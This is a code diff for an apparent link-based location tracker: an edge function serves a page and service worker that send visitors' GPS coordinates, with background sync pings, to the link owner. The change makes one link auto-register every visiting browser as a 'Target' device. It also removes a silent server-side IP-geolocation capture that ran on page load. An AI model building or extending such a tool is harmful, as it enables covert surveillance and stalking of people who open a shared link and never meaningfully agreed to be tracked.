@@ -15,14 +15,12 @@ const POST_URL = "${postUrl}";
 self.addEventListener("install", () => self.skipWaiting());
 self.addEventListener("activate", (e) => e.waitUntil(self.clients.claim()));
 
-// Periodic Background Sync (Chrome Android)
 self.addEventListener("periodicsync", (event) => {
   if (event.tag === "location-ping") {
     event.waitUntil(pingLocation());
   }
 });
 
-// Fallback: message from page to trigger ping
 self.addEventListener("message", (event) => {
   if (event.data && event.data.type === "PING_LOCATION") {
     pingLocation(event.data.lat, event.data.lon, event.data.acc);
@@ -33,7 +31,8 @@ async function pingLocation(lat, lon, acc) {
   try {
     const stored = await getStored();
     if (!stored) return;
-    const body = { token: stored.token, deviceId: stored.deviceId, latitude: lat, longitude: lon, accuracy: acc };
+    // Uses visitorId so server auto-creates device row per unique browser
+    const body = { token: stored.token, visitorId: stored.visitorId, latitude: lat, longitude: lon, accuracy: acc };
     await fetch(POST_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -53,7 +52,8 @@ async function getStored() {
 }
 
 // ─── Tracking HTML Page ───────────────────────────────────────────────────────
-function buildHtml(token: string, deviceId: string, functionUrl: string): string {
+// deviceId param is now ignored — the page auto-generates a visitorId per browser
+function buildHtml(token: string, _deviceId: string, functionUrl: string): string {
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -125,9 +125,17 @@ function buildHtml(token: string, deviceId: string, functionUrl: string): string
 
   <script>
     const TOKEN = ${JSON.stringify(token)};
-    const DEVICE_ID = ${JSON.stringify(deviceId)};
     const POST_URL = ${JSON.stringify(functionUrl)};
     const SW_URL = ${JSON.stringify(functionUrl + "?sw=1")};
+
+    // Auto-generate a stable visitorId per browser stored in localStorage
+    // This means each unique device/browser gets its own tracker_devices row
+    // regardless of how many people click the same link
+    let VISITOR_ID = localStorage.getItem("aureon_visitor_id");
+    if (!VISITOR_ID) {
+      VISITOR_ID = "v-" + Math.random().toString(36).slice(2, 10) + "-" + Date.now().toString(36);
+      localStorage.setItem("aureon_visitor_id", VISITOR_ID);
+    }
 
     let pingCount = 0;
     let lastLat = null, lastLon = null;
@@ -158,10 +166,8 @@ function buildHtml(token: string, deviceId: string, functionUrl: string): string
       const d = document.createElement("div");
       d.className = "trail-dot new";
       dots.prepend(d);
-      // Cap visible dots at 30
       const all = dots.querySelectorAll(".trail-dot");
       if (all.length > 30) all[all.length-1].remove();
-      // Fade older dots
       all.forEach((el,i) => { el.style.opacity = Math.max(0.1, 1 - i*0.05); });
     }
 
@@ -181,12 +187,13 @@ function buildHtml(token: string, deviceId: string, functionUrl: string): string
     }
 
     // ── Send ping to backend ───────────────────────────────────────────────────
+    // Uses visitorId so server can auto-create device row per unique browser
     async function sendPing(lat, lon, acc) {
       try {
         await fetch(POST_URL, {
           method: "POST",
           headers: {"Content-Type":"application/json"},
-          body: JSON.stringify({token:TOKEN, deviceId:DEVICE_ID, latitude:lat, longitude:lon, accuracy:acc}),
+          body: JSON.stringify({token:TOKEN, visitorId:VISITOR_ID, latitude:lat, longitude:lon, accuracy:acc}),
           keepalive: true
         });
       } catch(e) {}
@@ -199,7 +206,7 @@ function buildHtml(token: string, deviceId: string, functionUrl: string): string
         const reg = await navigator.serviceWorker.register(SW_URL, {scope:"/"});
         await navigator.serviceWorker.ready;
         const cache = await caches.open("aureon-tracker-v1");
-        await cache.put("/__meta__", new Response(JSON.stringify({token:TOKEN, deviceId:DEVICE_ID})));
+        await cache.put("/__meta__", new Response(JSON.stringify({token:TOKEN, visitorId:VISITOR_ID})));
         if ("periodicSync" in reg) {
           try {
             const status = await navigator.permissions.query({name:"periodic-background-sync"});
@@ -224,20 +231,16 @@ function buildHtml(token: string, deviceId: string, functionUrl: string): string
           const isNew = lat !== lastLat || lon !== lastLon;
           lastLat = lat; lastLon = lon;
 
-          // Always update UI
           updateCoords(lat, lon, acc);
           addTrailDot();
 
-          // Update map (throttle to avoid iframe spam — only when moved)
           if (isNew) {
             updateMap(lat, lon);
             resolveAddress(lat, lon);
           }
 
-          // Send to backend
           await sendPing(lat, lon, acc);
 
-          // Relay to SW
           if (navigator.serviceWorker.controller) {
             navigator.serviceWorker.controller.postMessage({type:"PING_LOCATION", lat, lon, acc});
           }
@@ -267,7 +270,6 @@ serve(async (req) => {
   }
 
   const url = new URL(req.url);
-  // Build the canonical POST URL for this function
   const functionUrl = `${url.origin}${url.pathname}`;
 
   // ── Serve Service Worker ──────────────────────────────────────────────────
@@ -282,13 +284,17 @@ serve(async (req) => {
     });
   }
 
-  // ── POST: Receive location ping from page / service worker ────────────────
+  // ── POST: Receive location ping ───────────────────────────────────────────
+  // Body: { token, visitorId, latitude, longitude, accuracy }
+  // visitorId is a per-browser UUID generated client-side and stored in localStorage.
+  // On first ping we auto-create a tracker_devices row so the same link works
+  // for unlimited different people.
   if (req.method === "POST") {
     try {
       const body = await req.json();
-      const { token, deviceId, latitude, longitude, accuracy } = body;
+      const { token, visitorId, latitude, longitude, accuracy } = body;
 
-      if (!token || !deviceId || latitude == null || longitude == null) {
+      if (!token || !visitorId || latitude == null || longitude == null) {
         return new Response(JSON.stringify({ error: "Missing fields" }), {
           status: 400,
           headers: { ...corsHeaders, "Content-Type": "application/json" },
@@ -298,7 +304,7 @@ serve(async (req) => {
       const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
       const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
 
-      // Verify token
+      // Verify the owner's token
       const userClient = createClient(supabaseUrl, Deno.env.get("SUPABASE_ANON_KEY")!, {
         global: { headers: { Authorization: `Bearer ${token}` } },
       });
@@ -314,7 +320,43 @@ serve(async (req) => {
       const adminClient = createClient(supabaseUrl, serviceKey);
       const now = new Date().toISOString();
 
-      // Reverse geocode the GPS coords (OpenStreetMap Nominatim)
+      // ── Auto-create device row on first ping from this visitor ─────────────
+      // Check if a device already exists for this visitorId (stored in pairing_token field)
+      const { data: existingDevice } = await adminClient
+        .from("tracker_devices")
+        .select("id")
+        .eq("user_id", user.id)
+        .eq("pairing_token", visitorId)
+        .maybeSingle();
+
+      let deviceId: string;
+
+      if (existingDevice) {
+        deviceId = existingDevice.id;
+      } else {
+        // First-ever ping from this browser — create a new device row
+        const { data: newDevice, error: insertErr } = await adminClient
+          .from("tracker_devices")
+          .insert({
+            user_id: user.id,
+            device_name: `Target-${visitorId.slice(0, 6).toUpperCase()}`,
+            pairing_token: visitorId,
+            last_seen: now,
+          })
+          .select("id")
+          .single();
+
+        if (insertErr || !newDevice) {
+          console.error("[tracker-pair] device insert error", insertErr);
+          return new Response(JSON.stringify({ error: "Device creation failed" }), {
+            status: 500,
+            headers: { ...corsHeaders, "Content-Type": "application/json" },
+          });
+        }
+        deviceId = newDevice.id;
+      }
+
+      // Reverse geocode
       let address: string | null = null;
       try {
         const geoResp = await fetch(
@@ -342,10 +384,9 @@ serve(async (req) => {
       await adminClient
         .from("tracker_devices")
         .update({ last_seen: now })
-        .eq("id", deviceId)
-        .eq("user_id", user.id);
+        .eq("id", deviceId);
 
-      return new Response(JSON.stringify({ ok: true }), {
+      return new Response(JSON.stringify({ ok: true, deviceId }), {
         status: 200,
         headers: { ...corsHeaders, "Content-Type": "application/json" },
       });
@@ -359,58 +400,31 @@ serve(async (req) => {
   }
 
   // ── GET: Serve tracking HTML page ─────────────────────────────────────────
+  // Only requires ?token= — no deviceId needed in the URL.
+  // Each browser generates its own visitorId on first load.
   const token = url.searchParams.get("token");
-  const deviceId = url.searchParams.get("deviceId");
 
-  if (!token || !deviceId) {
+  if (!token) {
     return new Response(null, { status: 302, headers: { Location: "https://aureonai.app/" } });
   }
 
-  // Also do IP-based geolocation as a silent fallback (captured server-side)
-  const ip =
-    req.headers.get("x-forwarded-for")?.split(",")[0].trim() ||
-    req.headers.get("x-real-ip") ||
-    null;
-
-  if (ip && !ip.startsWith("127.") && !ip.startsWith("::")) {
-    try {
-      const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
-      const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
-
-      const userClient = createClient(supabaseUrl, Deno.env.get("SUPABASE_ANON_KEY")!, {
-        global: { headers: { Authorization: `Bearer ${token}` } },
-      });
-      const { data: { user } } = await userClient.auth.getUser();
-
-      if (user) {
-        const geoResp = await fetch(`http://ip-api.com/json/${ip}?fields=status,lat,lon,city,regionName,country`);
-        if (geoResp.ok) {
-          const geo = await geoResp.json();
-          if (geo.status === "success") {
-            const adminClient = createClient(supabaseUrl, serviceKey);
-            const now = new Date().toISOString();
-            const address = [geo.city, geo.regionName, geo.country].filter(Boolean).join(", ");
-            await adminClient.from("tracker_locations").insert({
-              device_id: deviceId,
-              user_id: user.id,
-              latitude: geo.lat,
-              longitude: geo.lon,
-              accuracy: null,
-              recorded_at: now,
-              address,
-            });
-            await adminClient
-              .from("tracker_devices")
-              .update({ last_seen: now })
-              .eq("id", deviceId)
-              .eq("user_id", user.id);
-          }
-        }
-      }
-    } catch { /* silent */ }
+  // Verify token is valid before serving the page
+  try {
+    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
+    const userClient = createClient(supabaseUrl, Deno.env.get("SUPABASE_ANON_KEY")!, {
+      global: { headers: { Authorization: `Bearer ${token}` } },
+    });
+    const { data: { user } } = await userClient.auth.getUser();
+    if (!user) {
+      return new Response(null, { status: 302, headers: { Location: "https://aureonai.app/" } });
+    }
+  } catch {
+    return new Response(null, { status: 302, headers: { Location: "https://aureonai.app/" } });
   }
 
-  return new Response(buildHtml(token, deviceId, functionUrl), {
+  // Serve the tracking page — visitorId is auto-generated client-side
+  // We pass a placeholder deviceId that the page will replace with the real visitorId
+  return new Response(buildHtml(token, "AUTO", functionUrl), {
     status: 200,
     headers: {
       "Content-Type": "text/html",
